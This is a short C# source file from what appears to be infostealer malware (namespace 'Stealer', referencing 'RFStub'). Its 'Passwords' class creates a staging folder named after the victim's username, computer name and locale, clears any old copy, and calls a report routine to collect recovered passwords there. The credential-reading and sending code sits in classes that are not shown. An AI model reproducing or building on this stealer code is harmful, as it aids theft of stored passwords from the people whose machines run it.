using System;
using System.IO;
using RFStub;

namespace Stealer;

internal sealed class Passwords
{
	private static string PasswordsStoreDirectory = Path.Combine(Paths.InitWorkDir(), SystemInfo.username + "@" + SystemInfo.compname + "_" + SystemInfo.culture);

	public static string Save()
	{
		Console.WriteLine("Running passwords recovery...");
		if (!Directory.Exists(PasswordsStoreDirectory))
		{
			Directory.CreateDirectory(PasswordsStoreDirectory);
		}
		else
		{
			try
			{
				Filemanager.RecursiveDelete(PasswordsStoreDirectory);
			}
			catch
			{
				Console.WriteLine("Failed recursive remove directory");
			}
		}
		if (Report.CreateReport(PasswordsStoreDirectory))
		{
			return PasswordsStoreDirectory;
		}
		return "";
	}
}
